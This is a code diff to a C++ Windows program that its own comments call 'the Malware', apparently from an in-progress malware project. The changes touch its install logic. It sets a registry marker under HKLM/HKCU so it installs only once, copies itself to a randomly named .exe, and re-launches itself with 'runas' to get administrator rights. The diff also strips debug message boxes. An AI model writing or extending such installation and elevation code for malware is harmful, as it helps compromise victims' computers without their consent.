@@ -31,6 +31,7 @@ INT WINAPI wWinMain(
 		ExitProcess(EXIT_FAILURE);
 	}
 
+	// Get Process Heap Handle to free Argslist later on
 	HANDLE hHeap = GetProcessHeap();
 
 	// Save current Filename to Buffer
@@ -277,11 +278,12 @@ INT WINAPI wWinMain(
 					}
 
 					// Create Registry Key
-					if (!fnCreateRegistryKeyW(HKLM | HKCU, szREGISTRY_KEY, szREGISTRY_SUBKEY, REG_DWORD, nREGISTRY_VALUE)) {
+					if (!fnCreateRegistryKeyW(HKLM | HKCU, szREGISTRY_KEY)) {
 						// TODO: add nothing at all because I don't know what I should do here.
 						//		 If the functions fails well then it will fail.
 						//		 This function is only included because it is used to prevent the Malware to install itself multiple times,
 						//		 if the User manually executes the Malware after the initial Initialization
+
 					}
 				}
 			}
@@ -303,12 +305,8 @@ INT WINAPI wWinMain(
 	std::wstring szAdfn = szAdpn + L"\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
 	CoTaskMemFree(pszShkfp);
 
-	MessageBox(NULL, L"here 1", NULL, MB_OK);
-
 	// Check Registry Key/Type/Value
-	// TODO: find out why this is causing the program to crash if it returns a Value > 0
-	if (fnCheckRegistryKeyW(szREGISTRY_KEY, szREGISTRY_SUBKEY, REG_DWORD, nREGISTRY_VALUE)) {
-		MessageBox(NULL, L"here 2", NULL, MB_OK);
+	if (fnCheckRegistryKeyW(szREGISTRY_KEY)) {
 		if (!fnIsUserAdmin()) {
 			ShellExecute(NULL, L"runas", szMfn, NULL, NULL, SW_SHOWDEFAULT);
 
